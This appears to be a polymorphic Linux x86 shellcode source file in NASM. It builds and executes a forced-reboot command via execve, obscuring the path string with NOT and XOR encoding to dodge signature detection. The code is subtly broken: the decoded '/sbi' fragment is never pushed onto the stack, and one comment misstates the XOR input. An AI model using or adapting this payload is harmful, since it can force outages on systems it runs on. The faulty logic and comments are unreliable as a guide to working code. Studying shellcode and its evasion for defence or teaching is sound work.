; Filename: poly-force-reboot.nasm

global _start

section .text

_start:
	xor eax, eax
	push eax

	mov esi, 0x746f6f62		
	mov [esp-4], esi		; 1a. move 'boot' into [esp-4]
	sub esp, 4				; 1b. manual stack adjustment

	mov esi, 0x9a8dd091		; 2. NOT(0x65722f6e)
	not esi 				
	push esi				

	mov esi, 0xc3c8d985		; 3. XOR(0x65722f6e, 0xaaaaaaaa)
	xor esi, 0xaaaaaaaa
	mov ebx, esp

	push eax
	push word 0x662d
	mov esi, esp

	push eax
	push esi
	push ebx
	mov ecx, esp

	mov al, 0xb
	int 0x80
